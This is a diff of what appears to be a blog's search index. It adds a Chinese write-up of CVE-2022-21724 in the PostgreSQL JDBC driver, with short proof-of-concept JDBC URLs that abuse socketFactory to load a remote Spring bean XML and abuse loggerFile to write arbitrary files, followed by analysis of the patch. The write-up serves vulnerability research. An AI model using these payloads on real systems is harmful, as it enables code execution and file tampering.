@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>CVE-2022-21724 PostgresQL JDBC Drive 任意代码执行漏洞</title>
+    <link href="/2023/02/05/CVE-2022-21724-PostgresQL-JDBC-Drive-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/02/05/CVE-2022-21724-PostgresQL-JDBC-Drive-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无。</p><a id="more"></a><hr><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>9.4.1208 &lt;= PgJDBC &lt; 42.2.25</p><p>42.3.0 &lt;= PgJDBC &lt; 42.3.2</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>maven依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;    &lt;version&gt;42.3.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考文章使用的测试用漏洞代码：</p><pre><code class="java">String socketFactoryClass = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;String socketFactoryArg = &quot;http://127.0.0.1:8080/bean.xml&quot;;String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot; + socketFactoryClass + &quot;&amp;socketFactoryArg=&quot; + socketFactoryArg;DriverManager.getConnection(jdbcUrl);</code></pre><p>感觉跟之前的很像JXPath漏洞的利用方式，应该是数据库连接过程中会有指定对象实例化的过程。</p><p>运行一下就可以看到找不到类的报错，定位到SocketFactoryFactory类的getSocketFactory函数：</p><pre><code class="java">String socketFactoryClassName = PGProperty.SOCKET_FACTORY.get(info);if (socketFactoryClassName == null) {    return SocketFactory.getDefault();}try {    return (SocketFactory) ObjectFactory.instantiate(socketFactoryClassName, info, true,        PGProperty.SOCKET_FACTORY_ARG.get(info));} catch (Exception e) {    ...}</code></pre><p>调用ObjectFactory.instantiate函数实例化了输入的jdbc url中配置的工厂类：</p><pre><code class="java">@Nullable Object[] args = {info};Constructor&lt;?&gt; ctor = null;Class&lt;?&gt; cls = Class.forName(classname);try {    ctor = cls.getConstructor(Properties.class);} catch (NoSuchMethodException ignored) {}if (tryString &amp;&amp; ctor == null) {    try {    ctor = cls.getConstructor(String.class);    args = new String[]{stringarg};    } catch (NoSuchMethodException ignored) {    }}if (ctor == null) {    ctor = cls.getConstructor();    args = new Object[0];}return ctor.newInstance(args);</code></pre><p>可以看到，这里在寻找构造函数的时候存在参数要求：</p><ul><li><p>参数为Properties</p></li><li><p>或者参数为String</p></li><li><p>或者无参</p></li></ul><p>可利用的也没多少了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="函数调用1"><a href="#函数调用1" class="headerlink" title="函数调用1"></a>函数调用1</h4><p>加上spring-context-support依赖，开启tomcat，xml就用JXPath同款就行，漏洞正常触发。</p><h4 id="函数调用2"><a href="#函数调用2" class="headerlink" title="函数调用2"></a>函数调用2</h4><p>参数改成sslfactory和sslfactoryarg，看起来需要一个数据库服务端。</p><h4 id="文件写"><a href="#文件写" class="headerlink" title="文件写"></a>文件写</h4><p>参数改成loggerLevel和loggerFile：</p><pre><code class="java">String loggerLevel = &quot;debug&quot;;String loggerFile = &quot;test.txt&quot;;String shellContent = &quot;test&quot;;String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot; + loggerLevel + &quot;&amp;loggerFile=&quot; + loggerFile+ &quot;&amp;&quot; + shellContent;DriverManager.getConnection(jdbcUrl);</code></pre><p>Postgres数据库引擎在解析完URL后建立连接前会调用setupLoggerFromProperties函数，其中会打开日志文件：</p><pre><code class="java">final String driverLogFile = PGProperty.LOGGER_FILE.get(exprProps);...java.util.logging.Handler handler = null;if (driverLogFile != null) {    try {        handler = new java.util.logging.FileHandler(driverLogFile);        loggerHandlerFile = driverLogFile;    } catch (Exception ex) {        ...    }}</code></pre><p>没有目录校验，但是日志内容比较复杂，包括jdbc url，函数调用栈和异常等等。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>猜测修复方式是限制工厂类的类型，将postgresql依赖换成42.3.2版本的，会发现报错：</p><pre><code>警告: JDBC URL contains too many / characters</code></pre><p>找到org.postgresql.Driver类的parseURL函数，可以看到其对/出现的次数做了限制：</p><pre><code class="java">if (!urlServer.equals(&quot;//&quot;) &amp;&amp; !urlServer.equals(&quot;///&quot;)) {    if (urlServer.startsWith(&quot;//&quot;)) {        urlServer = urlServer.substring(2);        long slashCount = urlServer.chars().filter((ch) -&gt; {            return ch == 47;        }).count();        if (slashCount &gt; 1L) {            LOGGER.log(Level.WARNING, &quot;JDBC URL contains too many / characters: {0}&quot;, url);            return null;        }        ...    }    ...}</code></pre><p>除去开头的//外只能出现一次/，而端口和数据库名之间肯定要有一个/，所以参数里是肯定不能有/了，想从外面加载xml也就行不通了。</p><p>此时阅读代码可以发现，如果jdbc url的引擎后没有//，就会进入另一个代码块，那里面没有对/的次数限制，但是到了getSocketFactory调用构造函数时：</p><pre><code class="java">return (SocketFactory)ObjectFactory.instantiate(SocketFactory.class, socketFactoryClassName, info, true, PGProperty.SOCKET_FACTORY_ARG.get(info));</code></pre><p>多了一个SocketFactory.class的输入参数，后续加载类时：</p><pre><code class="java">Class cls = Class.forName(classname).asSubclass(expectedClass);</code></pre><p>要求工厂类要是SocketFactory的子类，基本上已经修好了。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/11812" target="_blank" rel="noopener">PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724)</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>JDBC</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2022-41852 Apache Commons JXPath 远程代码执行漏洞</title>
     <link href="/2023/02/04/CVE-2022-41852-Apache-Commons-JXPath-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/02/04/CVE-2022-41852-Apache-Commons-JXPath-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
@@ -597,9 +620,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JNDI</tag>
-      
       <tag>JRMP</tag>
+      
+      <tag>JNDI</tag>
       
     </tags>
     
@@ -958,9 +981,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>浏览器</tag>
       
@@ -1067,9 +1090,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>浏览器</tag>
       
@@ -1092,9 +1115,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>浏览器</tag>
       
@@ -1117,9 +1140,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>浏览器</tag>
       
@@ -1142,9 +1165,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>浏览器</tag>
       
@@ -2045,11 +2068,11 @@
       
       <tag>Web</tag>
       
+      <tag>JDBC</tag>
+      
       <tag>反序列化</tag>
       
       <tag>MySQL</tag>
-      
-      <tag>JDBC</tag>
       
     </tags>
     
@@ -2204,9 +2227,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JNDI</tag>
-      
       <tag>JRMP</tag>
+      
+      <tag>JNDI</tag>
       
     </tags>
     
@@ -2273,9 +2296,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>Web</tag>
+      
+      <tag>二进制</tag>
       
       <tag>复现</tag>
       
@@ -2298,9 +2321,9 @@
     
     <tags>
       
-      <tag>C++</tag>
-      
       <tag>Web</tag>
+      
+      <tag>C++</tag>
       
       <tag>Go</tag>
       
